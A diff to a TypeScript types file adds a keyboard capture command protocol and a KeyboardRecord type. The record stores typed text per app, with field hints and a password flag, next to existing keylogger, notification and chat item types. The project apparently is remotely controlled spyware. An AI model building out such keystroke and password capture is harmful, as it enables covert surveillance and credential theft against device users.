@@ -188,10 +188,38 @@ export interface NotificationItem {
   pkg: string;
 }
 
+// -----------------------------------------------------------------------------
+// KEYBOARD PROTOCOL & TYPES
+// -----------------------------------------------------------------------------
+
+export const CMD_KEYBOARD_ON = 'KEYBOARD_ON';
+export const CMD_KEYBOARD_OFF = 'KEYBOARD_OFF';
+export const ALIAS_KEYBOARD_START = 'KEYBOARD_START';
+export const ALIAS_KEYBOARD_STOP = 'KEYBOARD_STOP';
+
+export const RESP_KEYBOARD_STARTED = 'KEYBOARD_STARTED';
+export const RESP_KEYBOARD_STOPPED = 'KEYBOARD_STOPPED';
+export const RESP_KEYBOARD_ERROR_PREFIX = 'KEYBOARD_ERROR: ';
+
+export const TYPE_KEYBOARD_SNAPSHOT = 'KEYBOARD_SNAPSHOT';
+export const TYPE_KEYBOARD_NEW = 'KEYBOARD_NEW';
+
 export interface KeyloggerItem {
   app: string;
   query: string;
   time: string;
+}
+
+export interface KeyboardRecord {
+  id: string;
+  app: string;
+  appName: string;
+  text: string;
+  fieldHint?: string;
+  fieldId?: string;
+  inputType: string;
+  isPassword: boolean;
+  timestamp: number;
 }
 
 export interface ChatItem {
